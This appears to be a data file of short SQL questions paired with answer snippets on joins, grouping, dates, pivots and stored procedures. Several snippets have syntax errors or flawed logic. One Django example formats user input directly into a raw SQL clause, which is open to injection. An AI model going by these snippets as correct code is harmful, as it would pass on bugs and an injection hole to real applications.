  (CASE When ae.DisciplineID = 1 THEN ae.Mark ELSE null END) as 'A_Mark',
  (CASE When ae.DisciplineID = 2 THEN ae.Mark ELSE null END) as 'B_Mark',
  ...
FROM 
  Person p,
  LEFT OUTER JOIN Exam ae ON (p.Id = ae.PersonId)
ORDER BY p.Id, ae.DisciplineId
"
30844,51102,MYSQL - How to UPDATE after SELECT from a table,"UPDATE dvd_copies
SET your_column_to_update ='your value'
WHERE id_dvd = '001-192.168.1.103-6' AND id_toko='002'
ORDER BY id_copies DESC
LIMIT 2
"
3082,56662,select column values based on other column date,"WITH balances AS (
    SELECT ROW_NUMBER() OVER (PARTITION BY goalID ORDER BY monthDate ASC) n, startBalance, DATEPART(year, monthDate) [year]
    FROM Goals
)

SELECT [year], SUM(startBalance) startBalance
FROM balances
WHERE n = 1
GROUP BY [year]
"
5734,38666,how to trim a field with Persian text in SQL Server,"SELECT 
LTRIM(REVERSE(SUBSTRING(REVERSE([name]),1, CHARINDEX('٬', REVERSE('٬' + [name])) - 1)))
FROM dbo.City
"
32798,36332,sum up time column in 2 different tables,"    create view myview
    as SELECT r.resvdatetime, bt.bufferperiods, 
DATEADD(minute,bt.bufferperiods,r.resvdatetime) AS resvbookingtime
    FROM BufferTime bt
    Inner join Reservation r
    on r.resvId=bt.resvId
"
2743,21183,SQL SELECT from third level table,"SELECT  AccidentNumber, 'AccidentUnit' AS TableFound, c.PrimaryKey AS TableKeyValue
  FROM  tblAccident a INNER JOIN tblAccidentUnit b
      ON    a.AccidentNumber = b.AccidentNumber INNER JOIN tblAccidentUnitAlcohol c
        ON  b.PrimaryKey = c.ForeignKey
     AND    c.AlcoholValue BETWEEN <RANGE_START> AND <RANGE_END>
UNION       
SELECT  AccidentNumber, 'AccidentOccupant' AS TableFound, c.PrimaryKey AS TableKeyValue
  FROM  tblAccident a INNER JOIN tblAccidentOccupant b
      ON    a.AccidentNumber = b.AccidentNumber INNER JOIN tblAccidentOccupantAlcohol c
        ON  b.PrimaryKey = c.ForeignKey
     AND    c.AlcoholValue BETWEEN <RANGE_START> AND <RANGE_END>
UNION
SELECT  AccidentNumber, 'AccidentNonMotorist' AS TableFound, c.PrimaryKey AS TableKeyValue
  FROM  tblAccident a INNER JOIN tblAccidentNonMotorist b
      ON    a.AccidentNumber = b.AccidentNumber INNER JOIN tblAccidentNonMotoristAlcohol c
        ON  b.PrimaryKey = c.ForeignKey
     AND    c.AlcoholValue BETWEEN <RANGE_START> AND <RANGE_END>     
"
935,65429,Data cut in SQL Table,"Last_Name varchar(30),
"
19109,5250,How to join or subquery a table representing tiers,"SELECT i.id, i.price, MAX(f.fee), i.price + MAX(f.fee) 
FROM item i INNER JOIN fee f
ON i.price > f.cutoff
GROUP BY i.id, i.price
"
7382,73268,SQL and Visual Studios - Passing Variables," Public Sub UpdateClickCount(ByVal appName as String, ByVal linkName as String)
     Using sqlCon = new SqlConnection(connectionString)
          sqlCon.Open()
          Dim sqlText = ""UPDATE myTable SET clickCount = clickCount + 1 "" & _
                        ""WHERE appName = @name AND link = @link""
          Dim cmd = new SqlCommand(sqlText, sqlCon)
          cmd.Parameters.AddWithValue(""@name"", appName)
          cmd.Parameters.AddWithValue(""@link"", linkName)
          cmd.ExecuteNonQuery()
     End Using
 End Sub
"
33609,26829,"How to avoid multiple, almost identical, subqueries in mySQL","SELECT
   DISTINCT(liens.lienID),
   sub.r_sum as totalBill,
   sub.r_sum-lienSettlementAmount as savings,
FROM events
RIGHT JOIN liens ON events.childID = liens.lienID
LEFT JOIN (SELECT lienBills2Lien.lienID
            ROUND(SUM(lienBills.amount), 2)  as r_sum
            FROM lienBills2Lien
            LEFT JOIN lienBills ON lienBills2Lien.lienBillID = lienBills.lienBillID
            GROUP BY lienBills2Lien.lienID
          ) sub ON sub.lienID= liens.lienID
"
19765,50695,Oracle's dbms_metadata.get_ddl for object_type JOB,"select dbms_metadata.get_ddl('PROCOBJ', 'yourJobNameGoesHere') from dual;
"
10878,39492,Complex 'order by' or maybe sorting issue,"select t.Group, t.Recipe, t.Priority,
       max(priority) over (partition by t.group, t.recipe) as maxpriority
from tablename t
order by t.Group asc, 4 desc, t.Recipe, priority desc
"
10929,22779,How to find Day name?,"SELECT DATENAME(dw,'2000-1-1')
"
26349,38290,Sql COALESCE entire rows?," SELECT Id, Name, Email, Etc FROM tbl_Employees
      WHERE Id IN (SELECT ID From tbl_PeopleInID)
 UNION ALL
 SELECT Id, Name, Email, Etc FROM tbl_Customers
      WHERE Id IN (SELECT ID From tbl_PeopleInID) AND
            Id NOT IN (SELECT Id FROM tbl_Employees)
"
20096,22743,Parameterized Queries with LIKE and IN conditions,"string Name = ""someone"";
int[] categoryIDs = new int[] { 238, 1138, 1615, 1616, 1617,
                                1618, 1619, 1620, 1951, 1952,
                                1953, 1954, 1955, 1972, 2022 };

SqlCommand comm = conn.CreateCommand();

string[] parameters = new string[categoryIDs.Length];
for(int i=0;i<categoryIDs.Length;i++)
{
   parameters[i] = ""@p""+i;
   comm.Parameters.AddWithValue(parameters[i], categoryIDs[i]);
}
comm.Parameters.AddWithValue(""@name"",Name);
comm.CommandText = ""SELECT * FROM Products WHERE Category_ID IN ("";
comm.CommandText += string.Join("","", parameters) + "")"";
comm.CommandText += "" OR name LIKE '%' + @name + '%'"";
"
59,72086,SQL Server Cursor,"DECLARE db_cursor CURSOR FOR SELECT name, age, color FROM table; 
DECLARE @myName VARCHAR(256);
DECLARE @myAge INT;
DECLARE @myFavoriteColor VARCHAR(40);
OPEN db_cursor;
FETCH NEXT FROM db_cursor INTO @myName, @myAge, @myFavoriteColor;
WHILE @@FETCH_STATUS = 0  
BEGIN  

       --Do stuff with scalar values

       FETCH NEXT FROM db_cursor INTO @myName, @myAge, @myFavoriteColor;
END;
CLOSE db_cursor;
DEALLOCATE db_cursor;
"
8961,29142,Insert multiple rows from multiple rows,"INSERT INTO GiftsToCustomers (GiftId, CustomerId)
SELECT      GiftId, CustomerId
FROM        Gifts
CROSS JOIN  Customers
"
15327,62908,SQL query to fetch employees only from IT DEPT but there are common employess who are in IT and CSE Dept,"SELECT * FROM TABLE t1 WHERE DEPT = 'IT'
and not exists (select 'x' from TABLE t2 where t1.name = t2.name where t2.Dept not like 'IT')
"
38866,14033,sql join issue problem,"  select tm1.desc, tm2.desc, tm3.desc
  from test t
  join test_master tm1 on t.col1=tm1.id
  join test_master tm2 on t.col2=tm2.id
  join test_master tm3 on t.col3=tm3.id
"
16811,63021,Oracle SQL possible to trim characters before a character is found?,"SELECT REGEXP_SUBSTR('David', 'v.*') from dual
 WHERE REGEXP_LIKE('David', 'v.*')
"
23302,5561,SQL order by numeric and string attributes,"SELECT [Task], [Start Date] AS Start_Date, [End Date] AS End_Date, [Priority], [Time     Allowance] AS Time_Allowance, [Details] FROM [schedulerData0]
ORDER BY (CASE Priority
  WHEN 'Very High' Then 1  
  WHEN 'High' Then 2 
  WHEN 'Medium' Then 3 
  WHEN 'Low' Then 4 
  WHEN 'Very Low' Then 5
END), [Start Date] ASC, [End Date] DESC
"
36798,12363,Sql Stored Procedure to insert and update,"CREATE PROCEDURE  [dbo].[stprOrder]

 @OrderDate date,
 @OrderID nchar(50),
 @ShipToID nchar(50),
 @TotalAmt  decimal(18,2),
AS
BEGIN
  SET NOCOUNT ON;

  IF (SELECT TOP (1) 1 FROM ORDER WHERE OrderID = @OrderID) IS NULL
     INSERT INTO ORDER(OrderDate,OrderID,ShipToID,TotalAmt)
     Values(@OrderDate,@OrderID,@ShipToID,@TotalAmt)
  ELSE
    UPDATE ORDER SET OrderDate = @OrderDate, ShipToID = @ShipToID, TotalAmt = @TotalAmt
    WHERE OrderID = @OrderID
END
"
6185,933,SQL Query for : rows linked by one joint table link to another joint table,"SELECT s.* 
FROM students s
INNER JOIN joint_table_A a ON s.sid = a.sid
INNER JOIN joint_table_B b ON s.sid = b.sid
WHERE a.hid = 3
  AND b.uid = 1
"
38734,49003,Oracle Stored Procedure Name,"create or replace procedure ""!@#$%^&*();:<>?,./\|{}[]""( ""@#$%;<>^^@@&"" number )
is 
begin
  dbms_output.put_line( 'Output is ' || ""@#$%;<>^^@@&"" );
end;
/

exec ""!@#$%^&*();:<>?,./\|{}[]""( 2 );

run -------
Output is 2
"
36590,8289,"Insert id (autogenerated, only column)","INSERT INTO MyTable DEFAULT VALUES
"
30519,594,Sum and conditional in oracle sql,"select part 
from your_table
group by part
having 
  sum(OrderQty) - sum(ShippedQty) < max(QOH)
"
12879,66500,How to count all the enums in a SQL table,"Select Moderated, Count(Moderated)  FROM YourTable
Group BY Moderated
"
32322,30470,SQLDeveloper: Finding the total amount of rows within a database?,"DECLARE  
   t_name VARCHAR2(100);  
   total_rows NUMBER;  
   t_count NUMBER;  
BEGIN  
  total_rows := 0;  
  t_count := 0;  

  FOR rec IN (SELECT table_name FROM user_tables)  
  LOOP  
    EXECUTE IMMEDIATE 'select count(1) from '||rec.table_name  
    INTO t_count;  

    total_rows := total_rows + t_count;  
  END LOOP;  

  dbms_output.put_line('Total no of Rows: '||total_rows);  
EXCEPTION  
  WHEN OTHERS THEN  
    dbms_output.put_line(SQLERRM);  
END;     
"
5072,18379,MySQL Join 2nd table with not Unique Foreign Key,"SELECT learning_story.*
FROM   learning_story LEFT JOIN story_groups USING (story_id)
WHERE  learning_story.child_id = ? OR story_groups.child_id = ?
"
8501,43762,select statement over multiple columns in SQLite,"sqlite> select issue,url,steps from help where kw1='ie' or kw2='ie' or kw3='ie' or kw4='ie' or kw5='ie' or kw6='ie' or kw7='ie' or kw8='ie' or kw9='ie' or kw10='ie' or kw11='ie' or kw12='ie';
"
29634,46040,Incremental update of Table,"    MERGE A2 AS target
    USING (SELECT * FROM A1) AS source 
    ON (target.Id = source.Id AND target.a1 = Source.a1...) -- More join condition
    WHEN MATCHED THEN 
        UPDATE SET a2 = source.a2, a3 = source.a3 ------ more columns
WHEN NOT MATCHED THEN
    INSERT (Id, A1, a1, a2....)
    VALUES (source.Id, source.a1, source.a2.....) 

WHEN NOT MATCHED BY SOURCE
        THEN DELETE 
END;
"
32668,36863,compare counts of values in two tables,";WITH CTE1 AS
(
   SELECT ColName
          COUNT(ColName) AS NameCount
   FROM   Table1
   GROUP BY ColName
),CTE2 AS
(
   SELECT ColName
          COUNT(ColName) AS NameCount
   FROM   Table2
   GROUP BY ColName
)
SELECT * 
FROM   CTE1 C1
       FULL OUTER JOIN CTE2 C2
       ON C1.ColName = C2.ColName
WHERE  C1.NameCount <> C2.NameCount
"
24621,13000,Performing multiple inserts for a single row in a query,"MERGE tblPerson trgt
USING tblCompany src ON 1=0
WHEN NOT MATCHED 
THEN INSERT 
    (Forename, Surename)
    VALUES (src.ContactPersonForeName, src.ContactPersonSurename)
OUTPUT  src.CompanyID, INSERTED.PersonID
INTO  tblCompanyPerson (CompanyId, PersonID);
"
38016,51678,SQL NOT LIKE Wildcard Condition on Inner Join,"-- 1. using outer join where the outer table don't match
SELECT DISTINCT Employee_ID
FROM @tmp_vo_hr_acp_staff v
LEFT JOIN hr_grades g ON (v.hr_grade LIKE g.HR_Grade + '%') -- wildcard search
WHERE g.id IS NULL -- use any non nullable column from hr_grades here

-- 2. using EXISTS for set difference
SELECT DISTINCT Employee_ID
FROM @tmp_vo_hr_acp_staff v
WHERE NOT EXISTS (
    SELECT 'x' FROM hr_grades g WHERE v.hr_grade LIKE g.HR_Grade + '%'
)

-- 3. using the less popular ANY operator for set difference
SELECT DISTINCT Employee_ID
FROM @tmp_vo_hr_acp_staff v
WHERE NOT v.hr_grade LIKE ANY (
    SELECT g.HR_Grade + '%' FROM hr_grades g
)
"
19471,25184,How to use distinct and count for multiple columns in SQL query,"WITH CTE_Testtable AS (
 SELECT 
  Cust_Name,
  Contract,
  Status 
 FROM
  TESTTable
 WHERE
 Status = 'Active'
 GROUP BY 
 Cust_Name, Contract, Status
)
SELECT
 Cust_Name,
 COUNT(Cust_Name) Active_Count,
 STUFF((SELECT ', ' + Contract
  FROM 
   TESTTable B
  WHERE 
   B.Cust_Name = A.Cust_Name 
   AND Status = 'Active'
  GROUP BY Contract
  FOR XML PATH('')), 1, 2, '') 
FROM
 CTE_Testtable A
WHERE
 Status = 'Active'
GROUP BY 
 Cust_Name
"
33149,1594,Record that is related to all records of other table in SQL,"SELECT p.id, p.name /*Or use COUNT(*) or wrap in Exists 
                     if you don't care about ids and names*/
FROM Person p
WHERE NOT EXISTS
   (SELECT * FROM Obstacle o
    WHERE NOT EXISTS 
    (
       SELECT * FROM Person_overcomes_obstacle poo
       WHERE poo.person_id = p.id and o.id = poo.obstacle_id
    )
)
"
13927,31127,How to frame query for this?,"select zone_name,
       sum(case when tran_date between trunc(add_months(sysdate, -12), 'month') and
                                       trunc(add_months(sysdate, -11), 'month')
                then APC
           end) as PrevYear,
       sum(case when tran_date between trunc(add_months(sysdate, 0), 'month') and
                                       trunc(add_months(sysdate, 0), 'month')
                then APC
           end) as CurerntMonth,
       sum(case when tran_date between trunc(add_months(sysdate, -1), 'month') and
                                       trunc(add_months(sysdate, -1), 'month')
                then APC
           end) as LastMonth
from (select tran_date, ZONE_NAME,
             ROUND (nvl(sum(WALKIN_WITHOUT_CGROUP),0)/ COUNT(*),2) as APC,
             ROUND((nvl(SUM(SALES_VALUE),0)+nvl(sum(total_sales),0)- 
                    nvl(sum(net_sales),0)+nvl(sum(discount),0))/nvl(sum(BILLS_WITHOUT_CGROUP),0)
                  ) as ASPB
      from OUTLET_PAYMODE_REPORT_FACT A join
           OUTLET_DETAILS B
           on A.OUTLET_ID=B.OUTLET_ID 
      where SALES_VALUE>0
      group by zone_name,tran_date
     ) t
group by ZONE_NAME;
"
36844,43405,How to display all the record by date wise?,"SELECT A.PersonID, B.Date
FROM (SELECT DISTINCT PersonID from myTable) A, 
(SELECT DISTINCT Date from myTable) B
"
21490,41935,SQL: detect when a recurring log (every 30s) is missing,"select     A.CREATION_DATE as Start,  min(N.CREATION_DATE) as Finish
from       logTable  A
left join  logTable  N  on A.CREATION_DATE < N.CREATION_DATE
group by   A.CREATION_DATE
having     datediff(second, A.CREATION_DATE, min(N.CREATION_DATE)) > 30
"
39395,59449,Efficient query for the first result in groups (postgresql 9),"SELECT name, date
FROM
  (
    SELECT DISTINCT ON (name) name, date
    FROM table
    ORDER BY name, date
  ) AS id_date
ORDER BY date
LIMIT 300;
"
10579,43862,SQL one row output with count(),"SELECT 
    COUNT(*) as GesamtanzahlMitarbeiter,
    SUM(CASE WHEN HIREDATE LIKE '%80'THEN 1 ELSE 0) as ""1980"",
    SUM(CASE WHEN HIREDATE LIKE '%81'THEN 1 ELSE 0) as ""1981"",
    SUM(CASE WHEN HIREDATE LIKE '%82'THEN 1 ELSE 0) as ""1982"",
    SUM(CASE WHEN HIREDATE LIKE '%83'THEN 1 ELSE 0) as ""1983""
FROM EMP
"
15052,8525,"Group report together, possibly with SQL?","select
  last_Monday Week_Starting,
  max(
    case
      when days_after_last_Monday = 0 then mark
      else null
    end) Mon,   --if the # of days between previous Monday and reg_date is zero, then get the according mark
   max(
     case
      when days_after_last_Monday = 1 then mark
      else null
     end) Tues,
   max(
     case
      when days_after_last_Monday = 2 then mark
      else null
     end) Wed,
   max(
     case
      when days_after_last_Monday = 3 then mark
      else null
     end) Thurs,
   max(
     case
      when days_after_last_Monday = 4 then mark
      else null
     end) Fri,
   max(
     case
      when days_after_last_Monday = 5 then mark
      else null
     end) Sat
from
(
  select 
    reg_date,
    last_Monday,
    julianday(reg_date) - julianday(last_Monday) as days_after_last_monday,   --determine the number of days between previous Monday and reg_date
    mark
  from
  (
    select
      reg_date,
      case 
        when cast (strftime('%w', reg_date) as integer) = 1 then date(reg_date, 'weekday 1')
        else date(reg_date, 'weekday 1', '-7 days') 
      end last_monday,    --determine the date of previous Monday
      mark
    from
    (
      select 
        reg_date,
        group_concat(mark, '') mark  --concatenate am and pm marks for each reg_date
      from
      (
        SELECT
          reg_date,
          ampm,
          mark
        FROM register
        order by reg_date, ampm  --order by ampm so that am rows are selected before pm
      )
      group by reg_date
    )
  )
)
group by last_Monday
order by last_Monday;
"
25655,1666,Precedence of operators in SQL*Plus,"(((A - B) U B) - A)
"
13338,46877,Updating email addresses in MySQL (regexp?),"UPDATE  mytable
SET     email = REPLACE(email, '@domain.xx', '@domain.yy')
WHERE   email REGEXP '@domain.xx$'
"
30709,4155,how to know if between 2 date's it past 5 days - Oracle 10g?,"select case when
    abs(to_date('01/05/2009','DD/MM/YYYY') - to_date('06/05/2009','DD/MM/YYYY')) = 5
  then 'YES'
  else 'NO'
  end as ARE_DATES_5_DAYS_APART
from
  dual;
"
36354,21614,MSSQL join with itself,"SELECT
   id, 
   null as copy_id
FROM
   t1 
WHERE
  exists (select * from t2 where t1.id = t2.id)
UNION ALL
SELECT
   t1.id,
   t2.related_id
FROM
   t1 
   INNER JOIN t2
   ON t1.id = t2.id
"
22834,40113,Get Current Row Data in Oracle Trigger,"CREATE OR REPLACE TRIGGER ""DBUSER"".""TI_USERS"" 
  AFTER INSERT
  on Users

  for each row

declare numrows INTEGER;
begin

IF ( :new.flag IS NOT NULL ) Then

    select count(*) into numrows
      from Customer
      where
        /* %JoinFKPK(:%New,Customer,"" = "","" and"") */
        :new.Customer_Key = Customer.Customer_Key;
    if (
      /* %NotnullFK(:%New,"" is not null and"") */

      numrows = 0
    )
    then
      raise_application_error(
        -20002,
        'Cannot INSERT Users because Customer does not exist.'
      );
    end if;

end if;

end;
ALTER TRIGGER ""SIMPLEX"".""TI_USERS"" ENABLE
"
37410,24289,"MySQL: return single record with 50 IDs, instead of a 50 records with a single ID","SELECT group_concat(BookID SEPARATOR ' ') FROM tblBook WHERE AuthorID=9 GROUP BY BookID
"
26002,74106,Query on Many to Many tables with multiple OR/AND,"DECLARE @filterCount int = 3
DECLARE @filterSet TABLE ( filterNum int, filterName varchar(max) )

INSERT @filterSet VALUES
  (1,'blue'),(1,'green'),
  (2,'large'),(2,'xlarge'),
  (3,'forMen')

SELECT pf.ProductId
FROM tbProductFilter pf
INNER JOIN tbFilter f ON f.filterId = pf.filterId
INNER JOIN @filterSet s ON s.filterName = f.filterName
GROUP BY pf.productId
HAVING COUNT(DISTINCT s.filterNum) = @filterCount
"
29638,26305,Problem in SQL Query,"  SELECT * 
  FROM table1 
  WHERE EXISTS
    (SELECT * 
        FROM table2 
        WHERE table2.leftBorder>=table1.leftBorder 
        and table2.rightBorder<=table1.rightBorder)
"
23177,64679,Clean up SQL Code,"ISNULL(p.Guests, 0)
"
17431,14288,SQL Syntax for NOT IN and EXCEPT,"Select GeneName, count(*) from genes group by GeneName;
"
18408,74089,Trying to get Month to date sales value for each date,"select soh1.ShipDate, SUM(soh2.TotalDue) from 
   (select distinct ShipDate from sales.SalesOrderHeader
        where ShipDate < '2005-09-01' and ShipDate >= '2005-08-01') as soh1
   join sales.SalesOrderHeader soh2 
        on soh2.ShipDate <= soh1.ShipDate and soh2.ShipDate >= '2005-08-01' 
   group by soh1.ShipDate order by soh1.ShipDate
"
14426,8336,How to compare two datetime and find minutes,"your exmple

SELECT TIMEDIFF('2014-10-22 23:00:00.000','2014-10-22 20:00:00.000')

OR

SELECT TIMESTAMPDIFF(MINUTE, '2014-10-22 20:00:00', '2014-10-22 23:00:00')
"
2899,56948,SQL multiple column IN selections,"SELECT * 
FROM table T
WHERE (Juiced <> 'No') OR (Juiced LIKE 'yes' AND 
                                            (EXISTS (SELECT Size, Colour 
                                                     FROM [table] A 
                                                     WHERE A.Apples = T.Apples AND
                                                           -- put your 'balhh here...')))
"
7230,12425,sql query to count records by filter,"SELECT [ScheduleId],[EventId], s.[SkillId], [ADEmployeeId], sk.[Description],
       COUNT(*) OVER (PARTITION BY sk.Description) as col1,
       COUNT(ADEmployeeId) OVER (PARTITION BY sk.Description) as col2
FROM [Schedule] s INNER JOIN
     [Skills] sk
     ON s.SkillId = sk.SkillId
WHERE EventId = 1;
"
3487,36158,Check if any column is NOT NULL,"where coalesce(column_a, column_b, column_c, column_x) is not null 
"
3750,70487,group by oracle,"SELECT MIN(id), value AS id FROM table_1 GROUP BY value
"
26568,7793,What is the most efficient SQL query to do the following?,"SELECT Item.*
       ,CASE WHEN t.ItemID IS NOT NULL THEN 'YES' ELSE 'NO' END AS flag
FROM Item LEFT JOIN (SELECT DISTINCT ItemID FROM Love WHERE Username = someuser) t
        ON Item.ItemId = t.ItemId
"
34342,36415,How do I list the tables where the records comes from?,"select  TableName
,       Name
from    (
        select  'BABY_FOODS' as TableName
        ,       Name
        from    BABY_FOODS
        union all
        select  'BEEF_PRODUCTS'
        ,       Name
        from    BEEF_PRODUCTS
        ) as SubQueryAlias
where   Name in ('CEREAL', 'GOAT', 'HORSE', 'LETTUCE')
"
15281,64507,Best way to produce automated exports in tab-delimited form from Teradata?,".EXPORT OUTFILE &dwoutfile MODE RECORD FORMAT TEXT;
"
8235,30095,Why doesn't my stored procedure work for all records," SELECT T.* FROM
     (SELECT
            P.pk_PersonalInfo_ID, 
            P.PersonalInfoReligion, 
            P.PersonalInfoPhoneResidence,
            P.PersonalInfoPhoneoffice, 
            P.PersonalInfoNIC, 
            P.PersonalInfoName, 
            P.PersonalInfoMobile, 
            P.PersonalInfoMaritalStatus, 
            P.PersonalInfoGender, 
            P.PersonalInfoFatherHusbandName, 
            Convert(varchar, P.PersonalInfoEntryDateTime, 106) AS PersonalInfoEntryDateTime, 
            P.PersonalInfoEmailAddress,
            P.PersonalInfoDomicile, 
            Convert(varchar,P.PersonalInfoDOB, 106) as PersonalInfoDOB, 
            P.PersonalInfoComputerLiterate, 
            P.PersonalInfoAddress,
            P.fk_WebUsers_PersonalInfo_UserID, 
            PersonalInfoEmployeePicture, 
            SI.ServiceInfoInitialBPS, 
            SI.ServiceInfoInitialDesignation,
            ROW_NUMBER() OVER(PARTITION BY P.pk_personalInfo_ID ORDER BY SI.ServiceInfoJobStatus DESC) AS row_num
     From PersonalInfo AS P
         JOIN ServiceInfo AS SI ON SI.fk_PersonalInfo_ServiceInfo_PID= P.pk_PersonalInfo_ID) AS T
 WHERE T.row_num = 1
"
1796,61387,MySQL IN clause special query,"SELECT * FROM locations WHERE name IN ('city2','city3')
UNION
(SELECT * FROM locations WHERE name IN ('city1','country1') LIMIT 1)
"
5209,2132,SQL count char except when it's enclosed,"SELECT REGEXP_COUNT(
                  REGEXP_REPLACE(my_string, '(\""[^\""]*\"")', ''),
                  ',')
FROM    (
    SELECT  'string1,string2,""string,3"",string4' AS my_string
    FROM    DUAL);
"
17476,67319,Django regexp in field,"for m in M.objects.filter().extra(where=[""'{}' RLIKE `m`.`re`"".format(inp)])
    print(""{} matched"".format(m.id))
"
24390,63622,postgresql: Fast way to update the latest inserted row,"update myTable date='2013-11-11' where id IN(
       SELECT max(id) FROM myTable
)
"
15016,67621,Bringing records in TableA Not in Table B Left Outer Join,"SELECT * FROM TableA a
LEFT JOIN TableB b on b.Id=a.Id
WHERE b.ID is null
"
39785,52048,Sort chars in varchar2 alphabetically,"SELECT MIN(permutations)
FROM (SELECT REPLACE (SYS_CONNECT_BY_PATH (n, ','), ',') permutations
    FROM (SELECT LEVEL l, SUBSTR ('&col', LEVEL, 1) n
        FROM DUAL
        CONNECT BY LEVEL <= LENGTH ('&col')) yourtable
    CONNECT BY NOCYCLE l != PRIOR l)
WHERE LENGTH (permutations) = LENGTH ('&col')
"
22078,7216,Why doesn't this query run?,"SELECT fOpen.*, fClose.*
FROM (
  SELECT MIN(id) AS min_id, MAX(id) AS max_id
  FROM fixtures
  GROUP BY matchId, period, type
) ids
JOIN fixtures fOpen  ON ( fOpen.id  = ids.min_id )
JOIN fixtures fClose ON ( fClose.id = ids.max_id );
"
33230,51337,"An alternative to inserting multiple vaules into a single field, when the number of values is unknown","id 
parent_id
attribute_name
attribute_value
"
22109,57993,Select client informations about his reservation in SQL*Plus,"SELECT C.*
FROM Client C
LEFT JOIN Reservation R ON C.ID = R.ID -- outer join
  AND R.ResDate >= add_months(TRUNC(SYSDATE) + 1, 2) -- condition in join
WHERE R.ID IS NULL -- only return missed joins
ORDER BY Name ASC
"
8546,39484,How to run a query where it displays all items of a XML node?,"select T.N.value('@id', 'varchar(10)')
from A
  cross apply Z.nodes('/Roles/Role') as T(N)
"
12676,26907,Unknown column in WHERE clause when using subquery,"select l.*, u.name as fullname
  from listings l
  join users u
    on l.user = u.id
 where u.name like '%praveen%'
"
35070,23980,Substraction between 2 Time columns in MySQL,"floor(time_to_sec(time1) - time_to_sec(time2) / 60) as MinutesDiff
"
919,65365,row_number or rank similar data,"with yourtablewithrn as (
  select col1, col2, row_number() over (order by (select null)) rn
  from yourtable
  ), 
yourtablegrouped as (
  select *,
    rn - row_number() over (partition by col1 order by rn) as grp
  from yourtablewithrn
)
select col1,
       count(col2) AS cnt
from yourtablegrouped
group by col1, grp
order by min(rn)
"
16267,67674,Ordering a mysql table by date when the column is declared varchar,"  ORDER BY STR_TO_DATE(date,'%d/%m/%Y') DESC
"
27995,3125,T-SQL Get File Extension Name from a Column,"SELECT CASE 
         WHEN filepath LIKE '%.%' THEN RIGHT(filepath, Len(filepath) - 
                                                       Charindex('.', filepath)) 
         ELSE filepath 
       END FilePath 
FROM   tbl1 
"
39692,63728,Implementation of Rank and Dense Rank in MySQL,"SELECT transaction_no, register, adult, child
  FROM (
         SELECT
                ( CASE WHEN @prev_tno != transaction_no THEN @rn:=1 
                       ELSE @rn:=(@rn+1) END ) AS rn
              , @prev_tno:=transaction_no AS transaction_no
              , register, adult, child
           FROM instructor
              , (SELECT @rn:=0, @prev_tno:=NULL) AS row_nums
       ) src
 WHERE rn = 1
 ORDER BY register, transaction_no
"
5622,56976,"SQLite3, ""ALTER TABLE"" and durability","* a program crash,
* an operating system crash, or
* a power failure.
"
24022,34272,How to create a file system directory in a SQL Server 2005 call/query,"declare @Path varchar(100)
set @Path = 'c:\CreatedFromSQL'
EXEC master.dbo.xp_create_subdir @Path
"
23836,49693,sql statement query last data,"WITH years([year])
AS
(
SELECT   DISTINCT TOP 3 YEAR([date]) AS [date]
FROM     Table1
ORDER BY YEAR([date]) DESC
)
SELECT TOP 3 [year]
FROM years 
ORDER BY [year] ASC;
"
1761,5891,NOT IN not work in my query,"SELECT  a.*
FROM    data a
        LEFT JOIN page b
            ON a.ID = b.data_id
WHERE   b.data_id IS NULL
ORDER   BY a.title ASC
"
18024,65045,Oracle 10g Range Partition Query,"create table LAB6_ZL
(
  ID        number not null
 ,TITLE     varchar2(40)
 ,PUBID     char(3)
 ,PUBDATE   date
 ,constraint LAB6_PK primary key(ID)
)
partition by range (PUBDATE)
  (partition TWO
     values less than (date '2000-01-01')
  ,partition ONE
     values less than (date '2010-01-01')
  ,partition THREE
     values less than (MAXVALUE));
"
10549,9384,SQL: Is UNION the same as SELECT DISTINCT with UNION ALL subquery,"select distinct t.col1, t.col2
from t
union
select distinct t1.col1, t.col2
from t1;
"
29277,13965,Get date from string sqlite without date time,"String string = ""2004-12-23"";
String[] parts = string.split(""-"");
String part1 = parts[0]; // 2004
String part2 = parts[1]; // 12
String part3 = parts[2]; // 23
"
699,42235,"Search function, SQL Server","declare @temp nvarchar(50)
set @temp = 'France actors'

SELECT DISTINCT 
  a.ArticleID 
FROM 
  Article a
  JOIN SearchWords sw ON a.ArticleID = sw.ArticleID
WHERE
  exists (
    select 
      1 
    from 
      iter_charlist_to_tbl(@temp, ' ') s 
    where
      s.nstr = sw.SearchWord
  )
"
4997,12977,Database table design: How to use multiple tables to separate related data so that querying resultset is simpler or require less code?,"SELECT A.LICENSE_ID, 
       B.TAX, 
       get_desc(B.TAX) TAX_DESC, 
       B.INSURANCE, 
       get_desc(B.INSURANCE) INSURANCE_DESC, 
       B.BENEFIT, 
       get_desc(B.BENEFIT) BENEFIT_DESC
FROM BUSINESS A INNER JOIN LICENSE_REQ B ON A.LICENSE_ID = B.LICENSE_ID
"
4392,63856,How to combine two records in the same table,"Select option_date, option_symbol, option_price, option_expire_month, option_strike, sum(option_call_volume), sum(option_put_volume) 
from table 
group by option_date, option_symbol, option_price, option_expire_month, option_strike
"
12041,9420,Values of one column in different columns,"    Declare @table1 Table(Id int, Balance float)

    Insert into @table1 values (2449079, 2282.64)
    Insert into @table1 values (2449079, 0.00)
    Insert into @table1 values (2449079, 0.00)
    Insert into @table1 values (2452482, 10556.96)
    Insert into @table1 values (2452482, 0.00)
    Insert into @table1 values (2455481, 2000.64)
    Insert into @table1 values (2455481, 0.00)

    SELECT *
    FROM (
    SELECT Id, Balance,
    ('Bal' + CAST(ROW_NUMBER() OVER(PARTITION BY Id Order by Id asc) AS VARCHAR))AS row FROM @table1
    ) as s
    PIVOT
    (
      SUM(Balance)
      FOR row IN (Bal1, Bal2, Bal3, Bal4)
  )AS pvt
"
11084,3819,"OracleSQL: Assigning employees to groups with date values, querying current assignments by date","select *
from
(
  select 
    h.*,
    row_number() over (partition by emp_nr order by valid_from desc) as rn
  from history h 
  where valid_from <= 9131
)
where rn = 1
"
27947,39445,SQL (Oracle) nested select parameters,"select fred.name
  , fred.emp_num
from fred
  , joe
where fred.division = joe.division
and ((fred.grade = 1 and fred.department in (select department from mark) 
or (fred.grade = 2))
"
36942,61120,How to Carry forward a column value while inserting other column values in mysql?,"INSERT INTO my_table 
SELECT NULL
     , 'time5'
     , x.batchid
     , 1026 FROM my_table x 
  LEFT 
  JOIN my_table y 
    ON y.id > x.id -- or y.timestamp > x.timestamp if that's more appropriate
 WHERE y.id IS NULL;
"
10708,5024,Finding a calculated ratios less than the average (SQL),"SELECT 
    PlayerName, ROUND(SUM(A)/SUM(TO),2) AS ATORatio
FROM 
    Players_t 
INNER JOIN 
    GameStats_t ON Players_t.JerseyNumber=GameStats_t.JerseyNumber
